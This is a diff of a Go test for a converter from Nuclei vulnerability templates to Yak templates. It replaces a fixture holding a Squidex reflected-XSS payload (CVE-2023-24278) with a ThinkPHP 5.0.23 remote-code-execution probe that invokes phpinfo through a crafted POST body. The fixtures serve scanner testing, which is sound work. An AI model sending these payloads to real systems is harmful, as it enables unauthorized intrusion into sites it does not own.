@@ -1,6 +1,7 @@
 package httptpl
 
 import (
+	"fmt"
 	"testing"
 
 	"github.com/davecgh/go-spew/spew"
@@ -120,74 +121,41 @@ requests:
 }
 
 func TestCreateYakTemplateFromNucleiTemplateRaw_AttachSYNC(t *testing.T) {
-	var demo = `id: CVE-2023-24278
+	var demo = `
+id: mocked
 
 info:
-  name: Squidex <7.4.0 - Cross-Site Scripting
-  author: r3Y3r53
-  severity: medium
-  description: |
-    Squidex before 7.4.0 contains a cross-site scripting vulnerability via the squid.svg endpoint. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
-  reference:
-    - https://census-labs.com/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/
-    - https://www.openwall.com/lists/oss-security/2023/03/16/1
-    - https://nvd.nist.gov/vuln/detail/CVE-2023-24278
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 6.1
-    cve-id: CVE-2023-24278
-    cwe-id: CWE-79
+  name: ThinkPHP 5.0.23 - Remote Code Execution
+  author: dr_set
+  severity: critical
+  description: ThinkPHP 5.0.23 is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
+  tags: thinkphp,rce
   metadata:
-    shodan-query: http.favicon.hash:1099097618
-    verified: "true"
-  tags: cve,cve2023,xss,squidex,cms,unauth
+    max-request: 1
 
-variables:
-  a1: "{{rand_int(1000,9000)}}"
-  a2: "{{rand_int(1000,9000)}}"
-  a3: "{{rand_int(1000,9000)}}{{a1}}"
-  a4: "{{rand_int(1000,9000)}}{{a2}}------{{a1+a2}}=={{a1}}+{{a2}}  {{to_number(a1)*to_number(a2)}}=={{a1}}*{{a2}}"
-
-requests:
-  - method: GET
+http:
+  - method: POST
     path:
-      - "{{BaseURL}}/squid.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
-      - "{{BaseURL}}/squi{{a4}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
-      - "{{BaseURL}}/squi{{md5(a4)}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
-      - "{{BaseURL}}/squi{{md5(a4)}}{{a1}}d.svg?title=Not%20Found&text=This%20is%20not%20the%20page%20you%20are%20looking%20for!&background=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cimg%20src=%22&small"
-    headers:
-      Authorization: "{{a1+a3}} {{a2}} {{BaseURL}}"
-      Test-Payload: "{{name}} {{a6}}"
+      - "{{BaseURL}}/index.php?s=captcha&c=Inotify&function=hello&u=123"
 
-    attack: pitchfork
-    payloads:
-      name:
-        - "admin123"
-        - "aaa123"
-      a6:
-        - "321nimda"
-        - 321aaa
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
 
     matchers-condition: and
     matchers:
       - type: word
-        part: body
         words:
-          - "<script>alert(document.domain)</script>"
-          - "looking for!"
-          - "{{md5(a4)}}"
-        condition: or
-
-      - type: word
-        part: header
-        words:
-          - "image/svg+xml"
+          - "PHP Extension"
+          - "PHP Version"
+          - "ThinkPHP"
+        condition: and
 
       - type: status
         status:
-          - 200
-
-# Enhanced by md on 2023/04/14`
+          - 200`
 	data, err := CreateYakTemplateFromNucleiTemplateRaw(demo)
 	if err != nil {
 		panic(err)
@@ -209,9 +177,9 @@ requests:
 		panic("variable failed!")
 	}
 
-	if ret := data.Variables.ToMap(); len(ret) != 4 {
+	if ret := data.Variables.ToMap(); len(ret) != 0 {
 		spew.Dump(ret)
-		panic("variable failed!111")
+		panic(fmt.Sprintf("variables length error: %v(got) != 0(want)", len(ret)))
 	} else {
 		spew.Dump(ret)
 	}
@@ -225,8 +193,8 @@ requests:
 	if err != nil {
 		panic(err)
 	}
-	if n != 8 {
-		panic(1)
+	if n != 1 {
+		panic(fmt.Sprintf("nuclei exec failed: %v(got) != 1(want)", n))
 	}
 	log.Infof("found N: %v", n)
 }
